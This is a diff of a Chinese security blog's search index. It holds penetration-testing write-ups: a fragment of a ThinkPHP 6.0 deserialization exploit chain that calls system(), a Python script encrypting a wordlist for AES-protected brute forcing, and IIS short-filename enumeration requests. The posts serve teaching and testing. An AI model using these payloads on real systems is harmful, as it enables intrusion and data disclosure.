class="variable">$withAttr</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;pwd&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"> <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// echo urlencode(serialize($a));</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05-参考"></a>0x05-参考</h2><p><a href="https://xz.aliyun.com/t/9546#toc-18">https://xz.aliyun.com/t/9546#toc-18</a></p>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>反序列化</tag>
-        <tag>ThinkPHP</tag>
-        <tag>WEB安全</tag>
-      </tags>
   </entry>
   <entry>
     <title>ThinkPHP6.0.*反序列化漏洞-2</title>
@@ -290,24 +308,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2022/03/18/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>内网穿透之ssh反向隧道</title>
     <url>/2022/03/19/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8Bssh%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93/</url>
     <content><![CDATA[<h1 id="ssh反向隧道"><a href="#ssh反向隧道" class="headerlink" title="ssh反向隧道"></a>ssh反向隧道</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>一种简单的内网穿透方式</p>
@@ -354,6 +354,24 @@
         <tag>内网穿透</tag>
         <tag>ssh</tag>
         <tag>代理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>暴力破解之前端AES加密</title>
+    <url>/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>某次测试中遇到一个信息泄露漏洞。页面提供一个查询功能，用户需要填写两个或三个参数值，且参数值正确才能返回相关信息。在测试中，发现仅需提供一个参数值即可以返回相关信息。如在提供<em><strong>姓名输入框</strong></em>中填入：“吴翠”，即可返回“吴翠”的相关信息。</p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318120459.png"></p>
+<h2 id="0x02-AES加密的参数"><a href="#0x02-AES加密的参数" class="headerlink" title="0x02-AES加密的参数"></a>0x02-AES加密的参数</h2><p>测试过程中，发现参数值经过加密，翻查JS文件，确认是AES加密。<br>一开始的想法是使用 Burpsuite 的 <code>JS Rainbow</code> 插件加载JS文件，自动执行加密函数加密参数值进行爆破，后发现导入字典测试的时候，由于字典内容为中文，会导致加密结果与预期不一致，后端无法解析加密后的数据，导致查询失败。<br>后续尝试使用 <code>BurpCrypto</code>、<code>AES KILLER</code>等 Burpsuite 插件时均与上面情况一样，中文内容加密与预期不一致。估计是由于 Burpsuite 软件自身问题。<br>再后使用 python 写个小程序，将字典加密，将加密结果作为字典导入 Burpsuite 爆破才成功。</p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318122718.png"></p>
+<p><strong>加密小程序源代码</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">b&#x27;FC5E8DF8BB4A2F78&#x27;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27;!1@2#3$4%5^6&amp;7*8&#x27;</span></span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    padtext=pad(text,<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line">    cipherText=cryptos.encrypt(padtext)</span><br><span class="line">    <span class="keyword">return</span> base64.encodebytes(cipherText)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;500.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fs.readlines():</span><br><span class="line">            name = <span class="built_in">bytes</span>(line.strip(),encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">            e = encrypt(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(e.strip(), encoding = <span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>WEB安全</tag>
+        <tag>暴力破解</tag>
+        <tag>AES</tag>
       </tags>
   </entry>
   <entry>
@@ -459,21 +477,344 @@
 ]]></content>
   </entry>
   <entry>
-    <title>暴力破解之前端AES加密</title>
-    <url>/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>某次测试中遇到一个信息泄露漏洞。页面提供一个查询功能，用户需要填写两个或三个参数值，且参数值正确才能返回相关信息。在测试中，发现仅需提供一个参数值即可以返回相关信息。如在提供<em><strong>姓名输入框</strong></em>中填入：“吴翠”，即可返回“吴翠”的相关信息。</p>
-<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318120459.png"></p>
-<h2 id="0x02-AES加密的参数"><a href="#0x02-AES加密的参数" class="headerlink" title="0x02-AES加密的参数"></a>0x02-AES加密的参数</h2><p>测试过程中，发现参数值经过加密，翻查JS文件，确认是AES加密。<br>一开始的想法是使用 Burpsuite 的 <code>JS Rainbow</code> 插件加载JS文件，自动执行加密函数加密参数值进行爆破，后发现导入字典测试的时候，由于字典内容为中文，会导致加密结果与预期不一致，后端无法解析加密后的数据，导致查询失败。<br>后续尝试使用 <code>BurpCrypto</code>、<code>AES KILLER</code>等 Burpsuite 插件时均与上面情况一样，中文内容加密与预期不一致。估计是由于 Burpsuite 软件自身问题。<br>再后使用 python 写个小程序，将字典加密，将加密结果作为字典导入 Burpsuite 爆破才成功。</p>
-<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318122718.png"></p>
-<p><strong>加密小程序源代码</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">b&#x27;FC5E8DF8BB4A2F78&#x27;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27;!1@2#3$4%5^6&amp;7*8&#x27;</span></span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    padtext=pad(text,<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line">    cipherText=cryptos.encrypt(padtext)</span><br><span class="line">    <span class="keyword">return</span> base64.encodebytes(cipherText)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;500.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fs.readlines():</span><br><span class="line">            name = <span class="built_in">bytes</span>(line.strip(),encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">            e = encrypt(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(e.strip(), encoding = <span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>]]></content>
+    <title>渗透测试之短文件名漏洞</title>
+    <url>/2022/03/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="渗透测试之短文件名漏洞"><a href="#渗透测试之短文件名漏洞" class="headerlink" title="渗透测试之短文件名漏洞"></a>渗透测试之短文件名漏洞</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>某次测试，使用 dirsearch 对网站目录进行扫描，突然发现一个终端出现一个奇怪的路径： <code>index~1</code> ，且响应码为 200。访问后发现该文件为 index 备份文件，浏览器直接显示文件源码。真奇怪啊，真奇怪。后面百度发现，<code>Apache + Windows</code> 组合，会存在短文件名下载漏洞。参考网上内容，整理合并资料，遂有下文。</p>
+<h2 id="0x02-Windows-Apache-x3D-短文件名任意文件下载"><a href="#0x02-Windows-Apache-x3D-短文件名任意文件下载" class="headerlink" title="0x02-Windows + Apache &#x3D; 短文件名任意文件下载"></a>0x02-Windows + Apache &#x3D; 短文件名任意文件下载</h2><p>Windows下采用了短文件名机制，如</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\wooyun12312394944545.txt</span><br></pre></td></tr></table></figure>
+
+<p>可采用如下方式访问</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\wooyun~1.txt</span><br></pre></td></tr></table></figure>
+
+<p>假如web应用程序中存在一个备份文件，文件名是这样的：<code>http://127.0.0.1/admin/databack/sql/metinfo_met_20140202_ixzlfo_1.zip</code>。当目标站点为 windows + apache(影响版本范围不确认，网上说 Apache 服务器默认支持短文件名访问) 的时候，我们就可以通过短文件名的方式直接下载文件：<code>http://127.0.0.1/admin/databack/sql/metinf~1.zip</code></p>
+<p><strong>漏洞证明：</strong></p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220324165011.png"></p>
+<p><em>PS : IIS 下不允许使用短文件来访问资源，而 Apache 支持短文件名来访问资源，因此上面介绍的任意文件下载只能适应于 windows 系统下的 Apache 搭建的网站中（Tomcat 也不支持使用短文件名来访问资源）。IIS 中虽然不能利用短文件名来访问资源，但是存在 IIS 短文件泄露漏洞，可以利用短文件名来猜测网站目录下的文件和目录名</em></p>
+<h2 id="0x03-IIS-短文件名"><a href="#0x03-IIS-短文件名" class="headerlink" title="0x03-IIS 短文件名"></a>0x03-IIS 短文件名</h2><h3 id="IIS短文件漏洞的由来"><a href="#IIS短文件漏洞的由来" class="headerlink" title="IIS短文件漏洞的由来"></a>IIS短文件漏洞的由来</h3><p>Microsoft IIS 短文件&#x2F;文件夹名称信息泄漏最开始由Vulnerability Research Team（漏洞研究团队）的Soroush Dalili在2010年8月1日发现，并于2010年8月3日通知供应商（微软公司）。微软公司分别于2010年12月1日和2011年1月4日给予答复下个版本修复。2012年6月29日，此漏洞公开披露（中危）。</p>
+<p>此漏洞实际是由HTTP请求中旧 <code>DOS 8.3</code> 名称约定（SFN）的代字符（<code>〜</code>）波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称（不应该可被访问）。攻击者可以找到通常无法从外部直接访问的重要文件，并获取有关应用程序基础结构的信息。</p>
+<p>Microsoft IIS 波浪号造成的信息泄露是世界网络范围内最常见的中等风险漏洞。这个问题至少从1990年开始就已经存在，但是已经证明难以发现，难以解决或容易被完全忽略。</p>
+<h3 id="IIS短文件漏洞影响范围及危害"><a href="#IIS短文件漏洞影响范围及危害" class="headerlink" title="IIS短文件漏洞影响范围及危害"></a>IIS短文件漏洞影响范围及危害</h3><h4 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h4><blockquote>
+<p>IIS 1.0，Windows NT 3.51\<br>IIS 3.0，Windows NT 4.0 Service Pack 2\<br>IIS 4.0，Windows NT 4.0选项包\<br>IIS 5.0，Windows 2000\<br>IIS 5.1，Windows XP Professional和Windows XP Media Center Edition\<br>IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition\<br>IIS 7.0，Windows Server 2008和Windows Vista<br>IIS 7.5，Windows 7（远程启用<customErrors>或没有web.config）<br>IIS 7.5，Windows 2008（经典管道模式）<br>IIS 8.0，Windows 8, Windows Server 2012<br>IIS 8.5，Windows 8.1,Windows Server 2012 R2<br>IIS 10.0，Windows 10, Windows Server 2016</p>
+</blockquote>
+<h4 id="支持方法"><a href="#支持方法" class="headerlink" title="支持方法"></a>支持方法</h4><p>DEBUG、OPTIONS、GET、POST、HEAD、TRACE<br><strong>IIS 7.5(Windows 2008 R2)</strong> 和 <strong>IIS 8.0(Windows 2012)</strong> 过程中，当使用 OPTIONS 来代替 GET 方法时，如果请求中的短文件名是存在的，IIS就会返回一个不一样的错误信息。<strong>IIS 8.0</strong>、<strong>IIS 8.5</strong> 和 <strong>IIS 10.0</strong> 的短文件名称均可以通过OPTIONS和TRACE方法被猜测成功。</p>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol>
+<li>利用 <code>~</code> 字符猜解暴露短文件&#x2F;文件夹名（主要危害）</li>
+<li>Net Framework 的拒绝服务攻击 （副危害）：<br>据Soroush Dalili在研究表明，攻击者如果在文件夹名称中向发送一个不合法的.Net文件请求，.NeFramework将递归搜索所有的根目录，消耗网站资源进而导致DOS问题。微软认为此危害是可恢复的DOS，将在后续SP版本修改，此处不做探讨研究。</li>
+</ol>
+<h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><ol>
+<li>只有前六位字符直接显示，后续字符用 ~1 指代。其中数字 1 还可以递增，如果存在多个文件名类似的文件（名称前6位必须相同，且后缀名前3位必须相同）；</li>
+<li>后缀名最长只有 3 位，多余的被截断，超过 3 位的长文件会生成短文件名；</li>
+<li>所有小写字母均转换成大写字母；</li>
+<li>长文件名中含有多个“.”，以文件名最后一个“.”作为短文件名后缀；</li>
+<li>长文件名前缀&#x2F;文件夹名字符长度符合 0-9 和 Aa-Zz 范围且需要大于等于 9 位才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件。</li>
+</ol>
+<p>我们可以在启用 .net 的 IIS 下使用GET方法暴力列举短文件名，原因是攻击者使用通配符 <code>*</code> 和 <code>?</code> 发送一个请求到 IIS,当 IIS 接收到一个文件路径中包含 <code>~</code> 请求时，它的反应是不同的，即返回的 HTTP 状态码和错误信息不同。基于这个特点，可以根据 HTTP 的响应区分一个可用或者不可用的文件。如下表所示不同 IIS 版本返回信息的不同：</p>
+<p><strong>IIS 5.0 ~ IIS 7.X短文件猜解HTTP响应信息：访问构造的某个存在的短文件名，会返回404；访问构造的某个不存在的短文件名，会返回400。</strong></p>
+<table>
+<thead>
+<tr>
+<th>IIS VERSION</th>
+<th>URL</th>
+<th>Result&#x2F;Error Message</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IIS 6</td>
+<td>&#x2F;valid*~1*&#x2F;.aspx</td>
+<td>HTTP 404 - File not found</td>
+</tr>
+<tr>
+<td>IIS 6</td>
+<td>&#x2F;Invalid*~1*&#x2F;.aspx</td>
+<td>HTTP 400 - Bad Request</td>
+</tr>
+<tr>
+<td>IIS 5.X</td>
+<td>&#x2F;valid*~1*</td>
+<td>HTTP 404 - File not found</td>
+</tr>
+<tr>
+<td>IIS 5.X</td>
+<td>&#x2F;Invalid*~1*</td>
+<td>HTTP 400 - Bad Request</td>
+</tr>
+<tr>
+<td>IIS 7.X.NET.2(No Error Handling)</td>
+<td>&#x2F;valid*~1*&#x2F;</td>
+<td>Page contains: “Error Code 0x00000000”</td>
+</tr>
+<tr>
+<td>IIS 7.X.NET.2(No Error Handling)</td>
+<td>&#x2F;Invalid*~1*&#x2F;</td>
+<td>Page contains: “Error Code 0x80070002”</td>
+</tr>
+</tbody></table>
+<p><strong>IIS 状态码猜解过程：IIS较低版本+ASP.NET 环境下使用GET方法反复循环猜测，直到猜解出短文件名</strong></p>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="http://sdl.me//*~1/*/.aspx">http://sdl.me/\*~1\*/.aspx</a></td>
+<td>404. Valid: one or more file(s)&#x2F;folder(s) with short name is&#x2F;are available on the server</td>
+</tr>
+<tr>
+<td><a href="http://sdl.me/a*~1*/.aspx">http://sdl.me/a*~1*/.aspx</a></td>
+<td>404 - Valid: It starts with“A”</td>
+</tr>
+<tr>
+<td><a href="http://sdl.me/aa*~1*/.aspx">http://sdl.me/aa*~1*/.aspx</a></td>
+<td>400 - Invalid: The second letter is not“A”</td>
+</tr>
+<tr>
+<td><a href="http://sdl.me/ab*~1*/.aspx">http://sdl.me/ab*~1*/.aspx</a></td>
+<td>400 - Invalid: The second letter is not“B”</td>
+</tr>
+<tr>
+<td><a href="http://sdl.me/ac*~1*/.aspx">http://sdl.me/ac*~1*/.aspx</a></td>
+<td>404 - Valid: The second letter is “C”</td>
+</tr>
+<tr>
+<td><a href="http://sdl.me/ac%3f~1*/.aspx">http://sdl.me/ac%3f~1*/.aspx</a></td>
+<td>400 - Invalid: It has more than three characters</td>
+</tr>
+<tr>
+<td><a href="http://sdl.me/ac%3f%3f%3f%3f~1/*/.aspx">http://sdl.me/ac%3f%3f%3f%3f~1\*/.aspx</a></td>
+<td>404 - Valid: It has 6 or more than 6 characters</td>
+</tr>
+<tr>
+<td><a href="http://sdl.me/acsecr~1*/.aspx">http://sdl.me/acsecr~1*/.aspx</a></td>
+<td>404 - Valid: It starts with“ACSECR”</td>
+</tr>
+<tr>
+<td><a href="http://sdl.me/acsecr/~1/.aspx">http://sdl.me/acsecr\~1/.aspx</a></td>
+<td>400 - Invalid: It is not a folder and it has an extension</td>
+</tr>
+<tr>
+<td><a href="http://dl.me/acsecr~1.%3f/.aspx">http://dl.me/acsecr~1.%3f/.aspx</a></td>
+<td>400- Invalid: Extension has more than 1 character</td>
+</tr>
+<tr>
+<td><a href="http://sdl.me/acsecr~1.%3f%3f%3f/.aspx">http://sdl.me/acsecr~1.%3f%3f%3f/.aspx</a></td>
+<td>404 - Valid: Extension has 3 or more characters</td>
+</tr>
+<tr>
+<td><a href="http://sdl.me/acsecr~1.a%3f%3f/.aspx">http://sdl.me/acsecr~1.a%3f%3f/.aspx</a></td>
+<td>400 - Invalid: Extension does not start with“A”</td>
+</tr>
+<tr>
+<td><a href="http://sdl.me/acsecr~1.h%3f%3f/.aspx">http://sdl.me/acsecr~1.h%3f%3f/.aspx</a></td>
+<td>404 - Valid: Extension starts with“H”</td>
+</tr>
+<tr>
+<td><a href="http://sdl.me/acsecr~1.htm/.aspx">http://sdl.me/acsecr~1.htm/.aspx</a></td>
+<td>404 - Valid: Extension starts with“HTM”</td>
+</tr>
+</tbody></table>
+<p>但是千里目实验室在真实环境验证发现，在IIS高版本（如：IIS 8.0&#x2F;IIS 8.5&#x2F;IIS 10.0），即使没有安装asp.net，通过 <code>OPTIONS</code> 和 <code>TRACE</code> 方法也可以猜解成功。这两种方法猜解返回的HTTP状态码类型和上述截图有些许出入，但是不失为另一种利用方式。</p>
+<p><strong>IIS 10.0 短文件猜解过程分析</strong></p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>原始扫描包URL解码</th>
+<th>HTTP状态码</th>
+<th>状态码含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>OPTIONS &#x2F;*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
+<td>404</td>
+<td>猜测成功，存在短文件漏洞</td>
+</tr>
+<tr>
+<td>2</td>
+<td>OPTIONS &#x2F;?*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
+<td>404</td>
+<td>猜测成功，存在1个及以上字母开头的文件</td>
+</tr>
+<tr>
+<td>3</td>
+<td>OPTIONS &#x2F;*T*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
+<td>404</td>
+<td>猜测成功，文件名中包含字母T</td>
+</tr>
+<tr>
+<td>4</td>
+<td>OPTIONS &#x2F;*~1.*T*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
+<td>404</td>
+<td>猜测成功，文件后综名包含字母T</td>
+</tr>
+<tr>
+<td>5</td>
+<td>OPTIONS &#x2F;*S*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
+<td>404</td>
+<td>猜测成功，文件名中包含字母S</td>
+</tr>
+<tr>
+<td>6</td>
+<td>OPTIONS &#x2F;*~1.*H*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
+<td>404</td>
+<td>猜测成功，文件后缀名包含字母H</td>
+</tr>
+<tr>
+<td>7</td>
+<td>OPTIONS &#x2F;*~1.*M*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
+<td>404</td>
+<td>猜测成功，文件后缀名包含字母M</td>
+</tr>
+<tr>
+<td>8</td>
+<td>OPTIONS &#x2F;*0*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名中包含数字0</td>
+</tr>
+<tr>
+<td>9</td>
+<td>OPTIONS &#x2F;*1*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名中包含数字1</td>
+</tr>
+<tr>
+<td>10</td>
+<td>OPTIONS &#x2F;I*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名中包含字母I开头文件</td>
+</tr>
+<tr>
+<td>11</td>
+<td>OPTIONS &#x2F;I?*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名I后面包含0个或多个字符</td>
+</tr>
+<tr>
+<td>12</td>
+<td>OPTIONS &#x2F;II*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名中第二个字母为I</td>
+</tr>
+<tr>
+<td>13</td>
+<td>OPTIONS &#x2F;II?*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名II后面包含0个或多个字符</td>
+</tr>
+<tr>
+<td>14</td>
+<td>OPTIONS &#x2F;IIS*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名中第三个字母为S</td>
+</tr>
+<tr>
+<td>15</td>
+<td>OPTIONS &#x2F;IIS?*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名IIS后面包含0个或多个字符</td>
+</tr>
+<tr>
+<td>16</td>
+<td>OPTIONS &#x2F;IIS1*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名中第四个字符为数字1</td>
+</tr>
+<tr>
+<td>17</td>
+<td>OPTIONS &#x2F;IIS1?*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名IIS1后面包含0个或多个字符</td>
+</tr>
+<tr>
+<td>18</td>
+<td>OPTIONS &#x2F;IIS10*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名中第五个字符为数字0</td>
+</tr>
+<tr>
+<td>19</td>
+<td>OPTIONS &#x2F;IIS10?*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名IIS10后面包含0个或多个字符</td>
+</tr>
+<tr>
+<td>20</td>
+<td>OPTIONS &#x2F;IIS10T*~1*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名中第六个字母为T</td>
+</tr>
+<tr>
+<td>21</td>
+<td>OPTIONS &#x2F;IIS10T~1?\a.aspx?aspxerrorpath</td>
+<td>200</td>
+<td>猜测失败，不包含多个相同的短文件名</td>
+</tr>
+<tr>
+<td>22</td>
+<td>OPTIONS &#x2F;IIS10T*~2*\a.aspx?aspxerrorpath</td>
+<td>200</td>
+<td>猜测失败，不包含2个相同的短文件名</td>
+</tr>
+<tr>
+<td>23</td>
+<td>OPTIONS &#x2F;IIS10T~1.H*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名未重复且后缀以开头</td>
+</tr>
+<tr>
+<td>24</td>
+<td>OPTIONS &#x2F;IIS10T~1.HT*\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功，文件名未重复且后缀第二字母为T</td>
+</tr>
+<tr>
+<td>25</td>
+<td>OPTIONS &#x2F;IIS10T~1.HTM\a.aspx?aspxerrorpath</td>
+<td>404</td>
+<td>猜测成功并结束，IIS10T~1.HIM被猜测出来</td>
+</tr>
+</tbody></table>
+<p><strong>TRACE方法猜解分析</strong></p>
+<p>通过TRACE方法猜解的过程基本同上，只不过此HTTP方法猜解失败返回的状态码不是200，而是501（未执行）。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="1-深入爆破猜测文件全名"><a href="#1-深入爆破猜测文件全名" class="headerlink" title="1. 深入爆破猜测文件全名"></a>1. 深入爆破猜测文件全名</h4><p>通过 IIS 短文件漏洞猜测出来的短文件名称，需要继续猜测出全名才可以在IIS上进行访问，即 IIS 由于安全原因不支持短文件名访问。以下是 Soroush Dalili 给出的几种猜测文件全名的方法：</p>
+<ol>
+<li>通过对目标网站或同类型网站进行爬虫，爬出建立一个字典库，再与得到的短文件名来猜剩下的字符 ；</li>
+<li>利用 <a href="http://code.google.com/p/fuzzdb/">fuzzdb</a> (一个应用程序模糊测试(fuzzing)数据库)来猜解；</li>
